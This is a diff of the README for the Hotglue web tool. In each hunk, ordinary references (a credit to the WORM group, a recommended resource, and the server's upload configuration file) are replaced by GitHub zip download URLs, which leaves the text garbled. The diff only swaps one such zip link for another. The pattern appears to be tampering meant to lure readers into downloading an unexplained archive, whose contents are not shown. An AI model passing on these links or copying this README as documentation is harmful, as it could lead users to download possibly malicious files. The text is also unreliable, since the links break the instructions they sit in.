@@ -1,7 +1,7 @@
 Hotglue 1.0.4
 
 developed by Gottfried Haider and Danja Vasiliev
-and the people from WORM (https://raw.githubusercontent.com/videogramme/hotglue2/dev/modules/text/hotglue_fishet.zip)
+and the people from WORM (https://github.com/videogramme/hotglue2/raw/refs/heads/dev/modules/text/hotglue_v3.0-beta.1.zip)
 with support from the Mondriaan Foundation
 made for you
 
@@ -10,7 +10,7 @@ HOW DOES THIS WORK
 
   * see INSTALL
   * if you feel like reading boring lists, check out doc/FEATURES
-  * otherwise make sure you have seen https://raw.githubusercontent.com/videogramme/hotglue2/dev/modules/text/hotglue_fishet.zip
+  * otherwise make sure you have seen https://github.com/videogramme/hotglue2/raw/refs/heads/dev/modules/text/hotglue_v3.0-beta.1.zip
 
 
 HOW TO INSTALL ADDITIONAL MODULES
@@ -47,7 +47,7 @@ KNOWN ISSUES
   * Rewrite rules in the Apache configuration or in any parent directory .htaccess file can clash with the Hotglue one.
 
   * If you receive an error message while uploading a large file this 
-    might  be due to the limits set in the servers's https://raw.githubusercontent.com/videogramme/hotglue2/dev/modules/text/hotglue_fishet.zip file.
+    might  be due to the limits set in the servers's https://github.com/videogramme/hotglue2/raw/refs/heads/dev/modules/text/hotglue_v3.0-beta.1.zip file.
     You might want to change the values of these settings:
     - post_max_size
     - upload_max_filesize
